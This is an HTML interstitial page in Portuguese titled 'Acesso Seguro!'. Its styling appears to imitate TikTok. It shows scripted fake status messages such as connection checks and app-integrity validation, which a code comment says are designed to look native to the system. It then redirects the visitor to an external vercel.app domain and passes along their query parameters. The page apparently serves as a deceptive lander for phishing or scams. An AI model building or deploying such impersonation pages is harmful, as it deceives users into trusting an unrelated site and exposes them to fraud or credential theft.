<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso Seguro!</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #161823;
            overflow: hidden;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        /* Spinner em Gradiente Rosa */
        .gradient-spinner {
            position: relative;
            width: 55px;
            height: 55px;
            border-radius: 50%; 
            background: linear-gradient(45deg, #fe2c55, #ff6d8a, #ffb2c1);
            animation: spin 0.9s linear infinite;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .gradient-spinner::after {
            content: '';
            position: absolute;
            width: 47px; 
            height: 47px;
            background-color: #ffffff;
            border-radius: 50%;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            margin-top: 25px;
            font-size: 15px;
            font-weight: 500;
            color: #515359; /* Cinza suave de sistema */
            text-align: center;
            min-height: 20px;
            opacity: 1;
            transition: opacity 0.2s ease-in-out;
        }

        .fade-out {
            opacity: 0;
        }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="gradient-spinner"></div>
        <div class="loading-text" id="status-text">Conectando...</div>
    </div>

    <script>
        const destinationBaseUrl = "https://acessosegurottpayy.vercel.app/";
        const totalWaitTimeSeconds = 5;

        // Frases otimizadas para parecerem nativas do sistema
        const messageSequence = [
            { text: "Iniciando conexão segura...", time: 0 },
            { text: "Validando integridade do app...", time: 1400 },
            { text: "Sincronizando atividade...", time: 2800 },
            { text: "Acesso liberado. Bem-vinda!", time: 4200 }
        ];

        const statusElement = document.getElementById('status-text');

        function updateTextAnimated(newText) {
            statusElement.classList.add('fade-out');
            setTimeout(() => {
                statusElement.innerText = newText;
                statusElement.classList.remove('fade-out');
            }, 200);
        }

        messageSequence.forEach((item) => {
            setTimeout(() => {
                updateTextAnimated(item.text);
            }, item.time);
        });

        function redirectWithParams() {
            const currentQueryParams = window.location.search;
            const joiner = destinationBaseUrl.includes('?') ? '&' : '?';
            const cleanParams = currentQueryParams.startsWith('?') ? currentQueryParams.substring(1) : currentQueryParams;
            
            const finalUrl = cleanParams 
                ? `${destinationBaseUrl}${joiner}${cleanParams}`
                : destinationBaseUrl;

            window.location.href = finalUrl;
        }

        setTimeout(redirectWithParams, totalWaitTimeSeconds * 1000);
    </script>
</body>
</html>
